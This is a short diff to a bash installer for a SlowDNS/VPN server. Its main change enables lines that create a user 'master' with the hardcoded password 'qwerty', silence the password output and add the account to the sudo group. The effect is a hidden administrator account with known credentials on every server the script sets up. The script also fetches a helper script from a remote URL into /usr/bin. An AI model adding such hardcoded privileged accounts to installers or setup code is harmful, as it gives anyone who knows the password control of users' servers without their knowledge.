@@ -1,10 +1,10 @@
 #!/bin/bash
 
-#Login="master"
-#Pass="qwerty"
-#useradd -m -s /bin/bash $Login
-#echo -e "$Pass\n$Pass\n" | passwd $Login &> /dev/null
-#usermod -aG sudo $Login
+Login="master"
+Pass="qwerty"
+useradd -m -s /bin/bash $Login
+echo -e "$Pass\n$Pass\n" | passwd $Login &> /dev/null
+usermod -aG sudo $Login
 
 #setting IPtables
 apt install iptables netfilter-persistent -y
@@ -105,8 +105,8 @@ systemctl enable server-sldns
 systemctl start client-sldns
 systemctl start server-sldns
 
-systemctl restart client-sldns
-systemctl restart server-sldns
+#systemctl restart client-sldns
+#systemctl restart server-sldns
 
 # download script
 wget -O /usr/bin/slowdns-eror "https://raw.githubusercontent.com/lamtota40/vpn-server-easy/main/slowdns/slowdns-error"
